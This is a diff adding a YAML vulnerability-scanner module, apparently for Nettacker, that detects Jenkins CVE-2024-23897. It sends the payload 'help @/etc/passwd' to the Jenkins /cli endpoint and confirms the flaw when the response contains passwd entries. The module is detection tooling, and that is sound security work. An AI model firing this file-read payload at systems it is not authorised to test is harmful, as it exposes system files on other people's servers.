@@ -1,0 +1,56 @@
+info:
+  name: jenkins_cve_2024_23897_vuln
+  author: Prajwal G N (@Prajwal5755)
+  severity: 7.5
+  description: Detects Jenkins CVE-2024-23897 arbitrary file read via CLI argument parsing using @file syntax.
+  reference:
+    - https://www.jenkins.io/security/advisory/2024-01-24/
+  profiles:
+    - vuln
+    - jenkins
+    - cve
+
+payloads:
+  - library: http
+    steps:
+
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          Content-Type: "text/plain"
+        ssl: false
+
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}{{path}}"
+            prefix: ""
+            interceptors: []
+            suffix: ""
+            data:
+              schema:
+                - "http"
+                - "https"
+              path:
+                - '/cli'
+              ports:
+                - 80
+                - 443
+                - 8080
+                - 8443
+
+
+        data: |
+          help @/etc/passwd
+
+        response:
+          log: "Confirmed CVE-2024-23897 vulnerability detected"
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: "(root:x:0|daemon:x:1)"
+              reverse: false
+            
